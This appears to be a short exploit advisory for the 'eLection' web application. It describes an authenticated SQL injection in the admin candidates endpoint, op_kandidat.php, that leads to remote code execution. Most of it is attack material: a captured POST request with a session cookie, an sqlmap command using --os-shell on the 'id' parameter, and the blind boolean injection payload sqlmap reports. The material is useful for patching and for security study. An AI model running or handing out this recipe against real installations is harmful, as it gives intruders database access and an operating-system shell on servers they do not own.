The eLection Web application is vulnerable to authenticated SQL Injection which leads to remote code execution:

Login to the admin portal and browse to the candidates section. Capture the request in BurpSuite and save it to file:

```
POST /election/admin/ajax/op_kandidat.php HTTP/1.1

Host: 10.22.6.110

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://10.22.6.110/election/admin/kandidat.php?_

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 17

Connection: close

Cookie: el_listing_panitia=5; el_mass_adding=false; el_listing_guru=5; el_listing_siswa=5; PHPSESSID=b4f0c3bbccd80e9d55fbe0269a29f96a; el_lang=en-us

aksi=fetch&id=256

```

Send the request to SQLMap with the following parameters:

```
sqlmap -r getcandidate --level=5 --risk=3 --os-shell -p id

```

SQLMap will find the injection:

```

Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: aksi=fetch&id=256 AND 8584=8584

```

Due to the way the setup of the application requires you to change permissions on the directory of the web app, you should be able
to get a shell.
